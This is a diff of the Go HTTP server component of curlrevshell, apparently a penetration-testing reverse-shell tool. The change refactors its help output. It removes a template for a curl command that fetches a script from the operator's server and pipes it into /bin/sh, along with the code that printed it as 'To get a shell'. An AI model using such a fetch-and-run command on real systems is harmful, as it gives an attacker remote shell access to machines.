@@ -6,7 +6,7 @@ package hsrv
  * HTTP server
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20241210
+ * Last Modified 20241217
  */
 
 import (
@@ -19,7 +19,6 @@ import (
 	"net"
 	"net/http"
 	"net/netip"
-	"os"
 	"reflect"
 	"slices"
 	"strconv"
@@ -31,20 +30,6 @@ import (
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 	"github.com/magisterquis/curlrevshell/lib/sstls"
-)
-
-const (
-	// CurlFormat prints the start of the curl command used to connect
-	// to us.
-	CurlFormat = `curl -sk --pinnedpubkey sha256//%s https://%s`
-
-	// FileSuffix is added to CurlFormat when telling the user how to get
-	// a file.
-	FileSuffix = ""
-
-	// ShellSuffix is added to CurlFormat when telling the user haw to get
-	// a shell.
-	ShellSuffix = "/%s | /bin/sh"
 )
 
 // Log messages and keys.
@@ -80,7 +65,6 @@ type Server struct {
 	/* Things for printing help. */
 	cbAddrs   []string
 	lAddrs    []string /* Listen addresses, for help. */
-	cbHelp    string   /* Callback help text. */
 	printIPv6 bool
 }
 
@@ -153,21 +137,6 @@ func New(
 		return nil, errors.New("no listen addresses")
 	}
 
-	/* Help text for user getting a callback. */
-	sb := new(strings.Builder)
-	sb.WriteRune('\n')
-	for _, la := range s.lAddrs {
-		fmt.Fprintf(
-			sb,
-			CurlFormat+ShellSuffix+"\n",
-			s.l.Fingerprint,
-			la,
-			s.ups.Script,
-		)
-	}
-	sb.WriteRune('\n')
-	s.cbHelp = sb.String()
-
 	/* Log the paths we're using if they're not the defaults. */
 	defUPS := crstemplate.URLPaths{
 		In:     crstemplate.DefaultURLPathIn,
@@ -201,33 +170,12 @@ func (s *Server) Do(ctx context.Context) error {
 	s.Logf(opshell.ColorNone, "Listening on %s", s.l.Addr())
 
 	/* Tell user where to get static files. */
-	if "" != s.fdir && 0 != len(s.lAddrs) {
-		s.Logf(ScriptColor, "To get files from %s:", s.fdir)
-		s.Printf(ScriptColor, "\n")
-		for _, a := range s.lAddrs {
-			s.Printf(
-				ScriptColor,
-				CurlFormat+FileSuffix,
-				s.l.Fingerprint,
-				a,
-			)
-		}
-		s.Printf(ScriptColor, "\n")
+	if "" != s.fdir {
+		s.printStaticFileHelp()
 	}
 
 	/* Tell user how to get a callback. */
 	s.printCallbackHelp()
-
-	/* Warn someone if we have a template filename but no template. */
-	if "" != s.tmplf {
-		if _, err := os.ReadFile(s.tmplf); nil != err {
-			s.ErrorLogf(
-				"Warning: Template file %s not readable: %s",
-				s.tmplf,
-				err,
-			)
-		}
-	}
 
 	/* Serve clients and watch events. */
 	eg, ectx := ctxerrgroup.WithContext(ctx)
@@ -324,14 +272,6 @@ func (s *Server) listenAddresses() ([]string, error) {
 	}
 
 	return addrs, nil
-}
-
-// printCallbackHelp prints a friendly message to the user instructing him how to
-// get a callback.
-func (s *Server) printCallbackHelp() {
-	/* Tell the user how to get a callback. */
-	s.Logf(ScriptColor, "To get a shell:")
-	s.Printf(ScriptColor, "%s", s.cbHelp)
 }
 
 // watchIOBEvents watches for events from the IO Broker and takes action.  Its
